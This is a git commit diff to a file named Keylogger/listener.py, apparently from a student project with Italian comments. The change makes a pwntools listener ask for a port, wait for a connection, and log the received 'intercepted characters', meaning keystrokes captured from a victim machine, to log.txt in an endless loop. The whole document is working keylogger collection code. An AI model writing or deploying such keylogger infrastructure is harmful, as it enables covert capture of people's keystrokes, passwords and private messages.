0def56b7e22b47fa4b3035e9a2a1cfdf1d98c1e3
Error404 <88632271+not1m3@users.noreply.github.com>
2022-05-25 21:28:21 +0200

    Update listener.py

--- Keylogger/listener.py
+++ Keylogger/listener.py
@@ -2,17 +2,17 @@
 # Alan Bovo, Simone Ceccarelli #
 ################################
 
-from pwn import *
-from datetime import datetime
+from pwn import *   #uso la libreria
 
+porta = str(input("Inserisci la porta: "))  #chiedo la porta da utilizzare
+porta = str(porta).replace("\n", "")    #levo il carattere a capo dalla porta
+porta = int(porta)  #converto la porta da stringa a intero
 
-l = listen(8080)
+l = listen(porta)   #ascolto sulla porta richiesta
 
-svr = l.wait_for_connection()
+svr = l.wait_for_connection()   #aspetto una connessione
 
-log = open('log.txt', 'w')
+log = open('log.txt', 'w')  #apro il file log.txt
 
-ora = datetime.now()
-
-while(True):
-    log.write(str(svr.recv().decode('utf-8')))
+while(True):    #inizio il ciclo principale
+    log.write(str(svr.recv().decode('utf-8')))  #scrivo sul file i caratteri intercettati
